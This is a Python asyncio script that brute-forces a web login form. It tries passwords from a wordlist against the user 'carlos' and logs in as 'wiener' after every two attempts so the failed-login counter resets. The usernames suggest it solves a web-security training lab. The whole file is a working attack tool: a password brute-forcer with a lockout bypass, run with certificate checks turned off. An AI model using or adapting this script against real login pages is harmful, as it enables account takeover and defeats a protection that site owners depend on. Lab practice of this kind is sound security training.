import asyncio
import aiohttp
from aiofiles import open as aopen
import sys

# Usage checking
if len(sys.argv) != 2:
    print("Usage: extention.py <url>")
    sys.exit(1)

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

urlab = sys.argv[1]
BATCH_SIZE = 2  # Number of passwords to try before checking if we need to reset

async def passwords_list_generator(file_path, batch_size):
    async with aopen(file_path, 'r') as file:
        while True:
            batch = [line.strip() for line in await file.readlines(batch_size)]
            if not batch:
                break
            yield batch

async def try_password(session, password):
    async with session.post(urlab, data={'username': 'carlos', 'password': password}, allow_redirects=False, ssl=False) as response:
        return password, response.status == 302

async def reset_login_attempts(session):
    async with session.post(urlab, data={'username': 'wiener', 'password': 'peter'}, allow_redirects=False, ssl=False) as response:
        return response.status == 302

async def main():
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        
        password_gen = passwords_list_generator('passwords.txt', BATCH_SIZE)
        attempt_count = 0
        
        async for batch in password_gen:
            tasks = [try_password(session, password) for password in batch]
            results = await asyncio.gather(*tasks)
            
            for password, is_correct in results:
                if is_correct:
                    print(f"Password found: {password}")
                    return
                print(f"{password} is incorrect")

            attempt_count += len(batch)
            if attempt_count >= BATCH_SIZE:
                print("Resetting login attempts")
                await reset_login_attempts(session)
                attempt_count = 0

        print("Finished without finding the password")

if __name__ == '__main__':
    asyncio.run(main())